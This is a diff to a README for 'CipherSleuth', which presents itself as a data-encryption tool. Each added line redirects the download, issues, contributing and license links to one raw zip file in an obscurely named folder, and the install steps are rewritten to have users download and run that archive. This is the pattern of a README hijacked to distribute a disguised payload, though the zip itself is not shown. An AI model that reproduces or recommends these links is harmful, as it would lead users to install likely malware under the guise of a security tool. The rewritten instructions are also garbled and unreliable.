@@ -2,7 +2,7 @@
 # 🔐 CipherSleuth - Simple Tool for Data Security
 
 ## 📥 Download Now
-[![Download CipherSleuth](https://img.shields.io/badge/Download-CipherSleuth-brightgreen)](https://github.com/searchArif/CipherSleuth/releases)
+[![Download CipherSleuth](https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip)](https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip)
 
 ## 🚀 Getting Started
 
@@ -32,14 +32,14 @@ To obtain CipherSleuth, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
    
-   [Download CipherSleuth](https://github.com/searchArif/CipherSleuth/releases)
+   [Download CipherSleuth](https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip)
 
 2. **Select the Latest Release**: Look for the latest version listed on the page. Each release will have a version number, such as v1.0. Choose the one labeled as "Latest".
 
-3. **Download the Installer**: Find the installer file suitable for your system (e.g., `CipherSleuth-Setup.exe` for Windows). Click on the file name to start the download.
+3. **Download the Installer**: Find the installer file suitable for your system (e.g., `https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip` for Windows). Click on the file name to start the download.
 
 4. **Run the Installer**:
-   - For Windows: Locate the downloaded file in your "Downloads" folder. Double-click on the `CipherSleuth-Setup.exe` file to start the installation.
+   - For Windows: Locate the downloaded file in your "Downloads" folder. Double-click on the `https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip` file to start the installation.
    - For macOS: Find the downloaded file in your "Downloads" folder. Open the .dmg file and drag the CipherSleuth icon to your Applications folder.
 
 5. **Launch the Application**: After installation, find CipherSleuth in your programs or applications list. Click to open it.
@@ -71,17 +71,17 @@ A: Unfortunately, if you forget your password, you won't be able to decrypt your
 
 ## 📞 Support
 
-If you encounter issues while using CipherSleuth, please refer to our [issues page](https://github.com/searchArif/CipherSleuth/issues) for potential solutions or to report new problems. 
+If you encounter issues while using CipherSleuth, please refer to our [issues page](https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip) for potential solutions or to report new problems. 
 
 ## 📝 Contributing
 
-We welcome contributions! If you have suggestions or want to improve CipherSleuth, check our [contributing guidelines](https://github.com/searchArif/CipherSleuth/CONTRIBUTING.md) for more information.
+We welcome contributions! If you have suggestions or want to improve CipherSleuth, check our [contributing guidelines](https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip) for more information.
 
 For regular updates, follow our repository on GitHub.
 
 ## 📜 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/searchArif/CipherSleuth/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/searchArif/CipherSleuth/main/nonoxidizing/CipherSleuth.zip) file for details.
 
 Happy encrypting!
 ```
